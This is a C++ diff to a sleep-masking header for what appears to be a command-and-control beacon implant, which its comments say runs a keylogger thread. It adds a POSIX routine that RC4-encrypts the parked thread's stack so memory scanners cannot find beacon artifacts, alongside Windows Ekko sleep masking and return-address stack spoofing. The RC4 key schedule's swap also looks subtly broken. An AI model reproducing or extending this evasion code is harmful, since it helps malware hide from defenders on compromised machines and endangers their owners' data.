@@ -112,7 +112,7 @@ inline bool spoof_stack(SpoofState& st) {
             reinterpret_cast<uint8_t*>(ret) > reinterpret_cast<uint8_t*>(tib->StackBase))
             break;
 
-        if (skipped < STACK_HASH_SKIP) { skipped++; rbp = (void**)*rbp; continue; }
+        if (skipped < static_cast<int>(STACK_HASH_SKIP)) { skipped++; rbp = (void**)*rbp; continue; }
 
         st.rets[st.count] = ret_slot;
         st.orig_ret[st.count] = ret;
@@ -252,6 +252,122 @@ inline void ekko_sleep_masked(DWORD sleepMs) {
     if (spoofed)
         restore_stack(*st);
     delete st;
+    volatile uint8_t* kp = key;
+    for (int k = 0; k < 16; ++k) kp[k] = 0;
+}
+
+}  // namespace ekko
+#else
+// ============================================================================
+//  sleep_mask.h — POSIX (Linux / macOS) sleep masking
+//  ──────────────────────────────────────────────────────────────────
+//  Windows masks the code pages + stack with an Ekko timer. On POSIX the
+//  same self-modifying-code trick is unsafe: hardened runtimes enforce W^X
+//  (macOS ARM64 needs signed MAP_JIT pages) and the beacon keeps a keylogger
+//  thread, so encrypting the code segment or the heap can corrupt a thread
+//  mid-flight. The achievable, SAFE equivalent is to RC4-encrypt the sleeping
+//  thread's stack region BELOW the live frames before the wait and decrypt
+//  after: residual beacon artifacts (paths, hostnames, task data) that a
+//  memory scan would find on the stack are ciphertext while the beacon is
+//  parked, and the live call chain is never touched.
+// ============================================================================
+#include <pthread.h>
+#include <unistd.h>
+#include <cerrno>
+#include <cstdint>
+#include <cstddef>
+#include <cstring>
+#include <ctime>
+
+namespace sleepmask {
+
+// RC4 keystream — self-inverse, so the same object decrypts what it encrypted
+// as long as the two crypt() calls are symmetric (no bytes in between).
+struct Rc4Context {
+    uint8_t s[256];
+    int i = 0, j = 0;
+    void init(const uint8_t* key, size_t keylen) {
+        for (int k = 0; k < 256; ++k) s[k] = static_cast<uint8_t>(k);
+        int jj = 0;
+        for (int k = 0; k < 256; ++k) {
+            jj = (jj + s[k] + key[k % keylen]) & 0xFF;
+            uint8_t t = s[k]; s[k] = static_cast<uint8_t>(jj); s[jj] = t;
+        }
+        i = j = 0;
+    }
+    void crypt(uint8_t* data, size_t len) {
+        for (size_t k = 0; k < len; ++k) {
+            i = (i + 1) & 0xFF;
+            j = (j + s[i]) & 0xFF;
+            uint8_t t = s[i]; s[i] = s[j]; s[j] = t;
+            data[k] ^= s[(s[i] + s[j]) & 0xFF];
+        }
+    }
+};
+
+// Stack bounds of the calling thread (low = stackaddr, high = stackaddr+size).
+inline bool thread_stack_bounds(uint8_t** low, uint8_t** high) {
+    pthread_attr_t attr;
+    if (pthread_getattr_np(pthread_self(), &attr) != 0) return false;
+    void* addr = nullptr;
+    size_t size = 0;
+    int rc = pthread_attr_getstack(&attr, &addr, &size);
+    pthread_attr_destroy(&attr);
+    if (rc != 0 || !addr || size == 0) return false;
+    *low = static_cast<uint8_t*>(addr);
+    *high = *low + size;
+    return true;
+}
+
+}  // namespace sleepmask
+
+namespace ekko {
+
+inline void ekko_sleep_masked(int sleepMs) {
+    using namespace sleepmask;
+    // 1. entropy — clock + pid, mixed with the low stack address so two runs
+    //    of the same beacon never share a keystream.
+    struct timespec now{};
+    clock_gettime(CLOCK_MONOTONIC, &now);
+    uint64_t material = static_cast<uint64_t>(now.tv_nsec) * 2654435761u ^
+                        static_cast<uint64_t>(now.tv_sec) ^
+                        static_cast<uint64_t>(getpid());
+    uint8_t key[16];
+    for (int k = 0; k < 16; ++k)
+        key[k] = static_cast<uint8_t>(material >> ((k % 8) * 8));
+
+    uint8_t *lo = nullptr, *hi = nullptr;
+    if (!thread_stack_bounds(&lo, &hi)) {          // cannot locate stack: plain sleep
+        struct timespec req{ sleepMs / 1000, static_cast<long>(sleepMs % 1000) * 1000000L };
+        while (nanosleep(&req, &req) == -1 && errno == EINTR) {}
+        return;
+    }
+
+    // 2. Only the region BELOW the live frames (plus a page of margin for the
+    //    red zone / signal handlers) is safe to encrypt; page-align both ends
+    //    and skip the guard page at the stack base.
+    uint8_t* sp = reinterpret_cast<uint8_t*>(__builtin_frame_address(0));
+    const uintptr_t PAGE = 4096;
+    const size_t MARGIN = 4096;                    // one page below the frame
+    auto align_up = [](uintptr_t v) { return (v + 4095) & ~static_cast<uintptr_t>(4095); };
+    auto align_dn = [](uintptr_t v) { return v & ~static_cast<uintptr_t>(4095); };
+    uintptr_t start_v = align_up(reinterpret_cast<uintptr_t>(lo) + PAGE);
+    uintptr_t end_v = (sp && reinterpret_cast<uintptr_t>(sp) > reinterpret_cast<uintptr_t>(lo))
+        ? align_dn(reinterpret_cast<uintptr_t>(sp) - MARGIN)
+        : reinterpret_cast<uintptr_t>(lo);
+    size_t len = (end_v > start_v) ? static_cast<size_t>(end_v - start_v) : 0;
+
+    Rc4Context rc4;
+    rc4.init(key, sizeof(key));
+    if (len) rc4.crypt(reinterpret_cast<uint8_t*>(start_v), len);
+
+    // 3. Wait. nanosleep is scheduler-visible like the Windows Sleep fallback;
+    //    the masking (not the wait) is what this path adds.
+    struct timespec req{ sleepMs / 1000, static_cast<long>(sleepMs % 1000) * 1000000L };
+    while (nanosleep(&req, &req) == -1 && errno == EINTR) {}
+
+    // 4. Unmask (self-inverse, same stream position) and wipe the key.
+    if (len) rc4.crypt(reinterpret_cast<uint8_t*>(start_v), len);
     volatile uint8_t* kp = key;
     for (int k = 0; k < 16; ++k) kp[k] = 0;
 }
